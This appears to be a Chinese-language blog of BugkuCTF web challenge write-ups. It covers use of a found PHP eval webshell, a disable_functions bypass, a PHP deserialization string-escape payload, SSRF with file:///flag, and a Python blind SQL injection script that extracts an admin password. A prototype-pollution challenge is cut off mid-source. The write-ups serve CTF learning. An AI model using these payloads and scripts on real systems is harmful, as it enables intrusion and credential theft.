<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><h5 id="1-打开发现php代码为乱码，应该是使用了php混淆加密，使用在线解密。"><a href="#1-打开发现php代码为乱码，应该是使用了php混淆加密，使用在线解密。" class="headerlink" title="1.打开发现php代码为乱码，应该是使用了php混淆加密，使用在线解密。"></a>1.打开发现php代码为乱码，应该是使用了php混淆加密，使用在线解密。</h5><h5 id="发现为-eval-POST-ymlisisisiook-为一句话木马，用蚁剑连接，发现只能查看html目录里的内容，其它不能查看。"><a href="#发现为-eval-POST-ymlisisisiook-为一句话木马，用蚁剑连接，发现只能查看html目录里的内容，其它不能查看。" class="headerlink" title="发现为@eval($_POST[ymlisisisiook]); 为一句话木马，用蚁剑连接，发现只能查看html目录里的内容，其它不能查看。"></a>发现为@eval($_POST[ymlisisisiook]); 为一句话木马，用蚁剑连接，发现只能查看html目录里的内容，其它不能查看。</h5><p>再用蚁剑上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">phpinfo(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functionspcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,ini_set,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mailpcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,ini_set,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,maildisplay_errorsOffOffdisplay_startup_errorsOffOffdoc_root*no value**no value*docref_ext*no value**no value*docref_root*no value**no value*enable_dlOffOffenable_post_data_readingOnOnerror_append_string*no value**no value*error_log/var/log/php/error.log/var/log/php/error.logerror_prepend_string*no value**no value*error_reporting41774177exit_on_timeoutOffOffexpose_phpOnOnextension_dir/usr/lib/php5/20121212/usr/lib/php5/20121212file_uploadsOnOnhighlight.comment#FF8000#FF8000highlight.default#0000BB#0000BBhighlight.html#000000#000000highlight.keyword#007700#007700highlight.string#DD0000#DD0000html_errorsOnOnignore_repeated_errorsOffOffignore_repeated_sourceOffOffignore_user_abortOffOffimplicit_flushOffOffinclude_path.:/usr/share/php:/usr/share/pear.:/usr/share/php:/usr/share/pearlog_errorsOnOnlog_errors_max_len10241024mail.add_x_headerOnOnmail.force_extra_parameters*no value**no value*mail.log*no value**no value*max_execution_time3030max_file_uploads2020max_input_nesting_level6464max_input_time6060max_input_vars10001000memory_limit128M128Mopen_basedir/var/www/html/:/tmp/:/proc//var/www/html/:/tmp/:/proc/output_buffering40964096output_handler*no value**no value*post_max_size8M8Mprecision1414realpath_cache_size16K16Krealpath_cache_ttl120120register_argc_argvOffOffreport_memleaksOnOnreport_zend_debugOnOnrequest_orderGPGPsendmail_from*no value**no value*sendmail_path/usr/sbin/sendmail -t -i /usr/sbin/sendmail -t -i serialize_precision1717short_open_tagOffOffSMTPlocalhostlocalhostsmtp_port2525sql.safe_modeOffOffsys_temp_dir*no value**no value*track_errorsOffOffunserialize_callback_func*no value**no value*upload_max_filesize2M2Mupload_tmp_dir*no value**no value*user_dir*no value**no value*user_ini.cache_ttl300300user_ini.filename.user.ini.user.inivariables_orderGPCSGPCSxmlrpc_error_number00xmlrpc_errorsOffOffzend.detect_unicodeOnOnzend.enable_gcOnOnzend.multibyteOffOffzend.script_encoding*no value**no value*</span><br></pre></td></tr></table></figure>

<p>发现以上内容</p>
<h5 id="2-执行命令的时候显示red-127，猜测应该是有disable-functions对执行命令的函数进行限制，查看phpinfo确认一下，以上代码就是确认的disable-functions"><a href="#2-执行命令的时候显示red-127，猜测应该是有disable-functions对执行命令的函数进行限制，查看phpinfo确认一下，以上代码就是确认的disable-functions" class="headerlink" title="2.执行命令的时候显示red=127，猜测应该是有disable_functions对执行命令的函数进行限制，查看phpinfo确认一下，以上代码就是确认的disable_functions"></a>2.执行命令的时候显示red=127，猜测应该是有disable_functions对执行命令的函数进行限制，查看phpinfo确认一下，以上代码就是确认的disable_functions</h5><h5 id="3-打开蚁剑，下载绕过disable-functions，加载插件，生成两个文件，再用-开头的文件重新加载，密码和之前一样，成功后，在根目录下即可获得flag。"><a href="#3-打开蚁剑，下载绕过disable-functions，加载插件，生成两个文件，再用-开头的文件重新加载，密码和之前一样，成功后，在根目录下即可获得flag。" class="headerlink" title="3.打开蚁剑，下载绕过disable_functions，加载插件，生成两个文件，再用.开头的文件重新加载，密码和之前一样，成功后，在根目录下即可获得flag。"></a>3.打开蚁剑，下载绕过disable_functions，加载插件，生成两个文件，再用.开头的文件重新加载，密码和之前一样，成功后，在根目录下即可获得flag。</h5><h4 id="newphp-php-反序列化字符串逃逸-当序列化之后对序列化的字符串进行修改时触发-ssrf"><a href="#newphp-php-反序列化字符串逃逸-当序列化之后对序列化的字符串进行修改时触发-ssrf" class="headerlink" title="newphp php 反序列化字符串逃逸(当序列化之后对序列化的字符串进行修改时触发) ssrf"></a>newphp php 反序列化字符串逃逸(当序列化之后对序列化的字符串进行修改时触发) ssrf</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php版本:5.4.44</span></span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hint</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;hint = <span class="variable">$hint</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;hint===<span class="string">&quot;hint.php&quot;</span>)</span><br><span class="line">      @<span class="keyword">$this</span>-&gt;hint = base64_encode(file_get_contents(<span class="keyword">$this</span>-&gt;hint)); </span><br><span class="line">    var_dump(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hint != <span class="string">&quot;╭(●｀∀´●)╯&quot;</span>) &#123; </span><br><span class="line">      <span class="comment">//There&#x27;s a hint in ./hint.php</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;hint = <span class="string">&quot;╰(●’◡’●)╮&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">  <span class="variable">$data</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">  <span class="variable">$tmp</span> = <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">  <span class="variable">$data</span> = <span class="variable">$tmp</span>;</span><br><span class="line">  <span class="variable">$r</span> = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> User(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/is&#x27;</span>,<span class="variable">$a</span>))</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;NoNoNo!&quot;</span>);</span><br><span class="line"></span><br><span class="line">unserialize(read(write(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<p>这里就有一个漏洞了，php反序列化字符串逃逸</p>
<p>php特性：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且是根据长度判断内容的</span><br><span class="line">2.对类中不存在的属性也会进行反序列化</span><br></pre></td></tr></table></figure>

<h5 id="漏洞原因：序列化的字符串在经过过滤函数不正确的处理而导致对象注入-当字符串长度不够时，反序列化会出错，所以通过字符串逃逸使反序列化成功"><a href="#漏洞原因：序列化的字符串在经过过滤函数不正确的处理而导致对象注入-当字符串长度不够时，反序列化会出错，所以通过字符串逃逸使反序列化成功" class="headerlink" title="漏洞原因：序列化的字符串在经过过滤函数不正确的处理而导致对象注入(当字符串长度不够时，反序列化会出错，所以通过字符串逃逸使反序列化成功)"></a>漏洞原因：序列化的字符串在经过过滤函数不正确的处理而导致对象注入(当字符串长度不够时，反序列化会出错，所以通过字符串逃逸使反序列化成功)</h5><p>并且如果对于a:2:{i:0;s:6:”tr1ple”;i:1;s:5:”aaaaa”;}i:1;s:5:”aaaaa”; 这种字符串而言，也能够正常反序列化，说明php在反序列化的时候只要求一个反序列化字符串块合法即可，当然得是第一个字符串块</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>=<span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> evil();</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">41</span>) <span class="string">&quot;O:4:&quot;</span>evil<span class="string">&quot;:1:&#123;s:4:&quot;</span>hint<span class="string">&quot;;s:8:&quot;</span>hint.php<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>构造User类序列化：</p>
<p>O:4:”User”:2:{s:8:”username”;s:3:”111”;s:8:”password”;s:41:”O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}”}</p>
<p>username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=1”;O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}</p>
<h5 id="其第一步序列化结果为O-4-”User”-2-s-8-”username”-s-48-”-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0”-s-8-”password”-s-44-”1”-O-4-”evil”-2-s-4-”hint”-s-8-”hint-php”"><a href="#其第一步序列化结果为O-4-”User”-2-s-8-”username”-s-48-”-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0”-s-8-”password”-s-44-”1”-O-4-”evil”-2-s-4-”hint”-s-8-”hint-php”" class="headerlink" title="其第一步序列化结果为O:4:”User”:2:{s:8:”username”;s:48:”\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0”;s:8:”password”;s:44:”1”;O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}}"></a>其第一步序列化结果为O:4:”User”:2:{s:8:”username”;s:48:”\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0”;s:8:”password”;s:44:”1”;O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}}</h5><h5 id="经过read函数变为"><a href="#经过read函数变为" class="headerlink" title="经过read函数变为"></a>经过read函数变为</h5><h5 id="s-8-”username”-s-48-”111111111111111111111111”-s-8-”password”-s-44-”1”-O-4-”evil”-2-s-4-”hint”-s-8-”hint-php”"><a href="#s-8-”username”-s-48-”111111111111111111111111”-s-8-”password”-s-44-”1”-O-4-”evil”-2-s-4-”hint”-s-8-”hint-php”" class="headerlink" title="{s:8:”username”;s:48:”111111111111111111111111”;s:8:”password”;s:44:”1”; O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}}"></a>{s:8:”username”;s:48:”111111111111111111111111”;s:8:”password”;s:44:”1”; O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}}</h5><h5 id="s-8-”password”-s-44-”1”-长度是24，去掉24个字符，后面就逃逸了，正常的被反序列化了"><a href="#s-8-”password”-s-44-”1”-长度是24，去掉24个字符，后面就逃逸了，正常的被反序列化了" class="headerlink" title="s:8:”password”;s:44:”1”;长度是24，去掉24个字符，后面就逃逸了，正常的被反序列化了"></a>s:8:”password”;s:44:”1”;长度是24，去掉24个字符，后面就逃逸了，正常的被反序列化了</h5><p>这样两部分就成功引起序列化了</p>
<h5 id="注意read中将’-0-0-0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。"><a href="#注意read中将’-0-0-0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。" class="headerlink" title="注意read中将’\0\0\0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。"></a>注意read中将’\0\0\0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。</h5><p>成功得到hint.php </p>
<p>string(68)”PD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7CiAvLyBZb3UgY2FuJ3Qgc2VlIG1lfgo=”</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">&quot;index.cgi&quot;</span>;</span><br><span class="line"> <span class="comment">// You can&#x27;t see me~</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;  <span class="string">&quot;args&quot;</span>: &#123;    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Bob&quot;</span>  &#125;,   </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;headers&quot;</span>: &#123;    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,     <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;httpbin.org&quot;</span>,     <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;curl/7.64.0&quot;</span>,     <span class="string">&quot;X-Amzn-Trace-Id&quot;</span>: <span class="string">&quot;Root=1-62641f4f-23fc1b7b738f818a52c57615&quot;</span>  &#125;,   </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;origin&quot;</span>: <span class="string">&quot;114.67.175.224&quot;</span>,   <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://httpbin.org/get?name=Bob&quot;</span> &#125;</span><br></pre></td></tr></table></figure>



<h5 id="感觉有ssrf"><a href="#感觉有ssrf" class="headerlink" title="感觉有ssrf"></a>感觉有ssrf</h5><p>知道ssrf存在然后就可以通过file协议来直接读取flag了</p>
<p>直接空格 发现出去了，file:///flag直接读取flag文件，得到flag</p>
<h5 id="http是以空格作为截断符的，有了空格，自动判断输入结束"><a href="#http是以空格作为截断符的，有了空格，自动判断输入结束" class="headerlink" title="http是以空格作为截断符的，有了空格，自动判断输入结束"></a>http是以空格作为截断符的，有了空格，自动判断输入结束</h5><p>最终构造url/index.cgi?name= file:///flag   一定要有空格</p>
<h4 id="都过滤了"><a href="#都过滤了" class="headerlink" title="都过滤了"></a>都过滤了</h4><p>到这我们整理一下手头的信息，概括性地来看SQL注入攻击的话，注入点、payload、服务器的响应，这时三个重要的要素。这一题的注入点我感觉不会是http首部什么的，应该就是uname和passwd了（因为我的尝试不断有发现）；payload的话有一些过滤我已经发现了，这个待会儿再说；倒是服务器的响应值得我们注意，目前得到的响应有三种，密码错、用户名错、检测到注入，我们挨个来看，密码错很明显就是admin用户是存在的，这就给我们这题提供了个方向，我们很可能就是要去拿到admin的密码，而用户名错显然就是用户不存在了，这里我们需要思考一下，既然服务器区别了用户不存在和密码错误这两种情况，那后端的SQL语句就不可能是一句 select * from user where username=用户名 and password=密码 这样的语句能够完成的了，必然还会有一句select  * from user where username=用户名 来检验用户名的存在与否，我们先来看看select * from user where username=用户名是不是存在注入呢？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:13241/&quot;</span></span><br><span class="line">cookie = &#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;dd0f1d95b41201cc44cc1332ee72e5b4&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):                                      <span class="comment">#select * from user where username=1&amp;passwd=2</span></span><br><span class="line">    payload1 = <span class="string">&quot;admin&#x27;^(length(passwd)=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)^&#x27;&quot;</span>    <span class="comment">#与0异或不变 admin&#x27;^(length(passwd)=i)^&#x27;闭合后面的 </span></span><br><span class="line">    data = &#123;                                                 <span class="comment">#后面的是空的，相当于0，总体是这个意思</span></span><br><span class="line">        <span class="string">&#x27;uname&#x27;</span>: payload1,									 <span class="comment">#字符串与数字比较会变成0</span></span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123&#x27;</span>							<span class="comment">#SELECT * FROM userdetail WHERE username=0 是永真的</span></span><br><span class="line">    &#125;										<span class="comment">#比较成功，返回1，username错误，反之，返回0，username正确</span></span><br><span class="line">    r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username error!!@_@&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密码的长度是&quot;</span>+<span class="built_in">str</span>(i))   </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;-(ascii(mid((passwd)from(&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)))=&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(j)) + <span class="string">&quot;)-&#x27;&quot;</span> <span class="comment">#字符串相减</span></span><br><span class="line">        data = &#123;         	<span class="comment">#相等就是1，为-1，失败，查询username，反之查询password</span></span><br><span class="line">            <span class="comment">#ascii()返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</span></span><br><span class="line">        <span class="string">&#x27;uname&#x27;</span>: payload,  <span class="comment">#这样就理顺了所有的代码</span></span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class="line">        <span class="comment"># print r.content</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;username error!!@_@&quot;</span> <span class="keyword">in</span> r.text:python</span><br><span class="line">            password += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密码是&quot;</span>+password)</span><br></pre></td></tr></table></figure>

<p>拿到可以执行命令的窗口就好弄了，空格被过滤了，那么就直接cat&lt;/flag</p>
<p>4dcc88f8f1bc05e7c2ad1a60288481a2</p>
<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a> 免费解密网站</p>
<p>bugkuctf</p>
<h4 id="sodirty"><a href="#sodirty" class="headerlink" title="sodirty"></a>sodirty</h4><h6 id="js原型污染"><a href="#js原型污染" class="headerlink" title="js原型污染"></a>js原型污染</h6><h5 id="1-御剑扫描，扫到www-zip-下载下来。"><a href="#1-御剑扫描，扫到www-zip-下载下来。" class="headerlink" title="1.御剑扫描，扫到www.zip,下载下来。"></a>1.御剑扫描，扫到<a target="_blank" rel="noopener" href="http://www.zip,下载下来./">www.zip,下载下来。</a></h5><p>源代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:process.env.password?process.env.password:<span class="string">&quot;password&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&quot;/getflag&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.password === <span class="literal">undefined</span> || req.body.password === req.session.challenger.password)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.session.challenger.age &gt; <span class="number">79</span>)&#123;</span><br><span class="line">            res.send(<span class="string">&quot;糟老头子坏滴很&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag ? process.env.flag : <span class="string">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;密码错误，请使用管理员用户名登录.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/reg&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.challenger = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>: <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;用户创建成功!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span 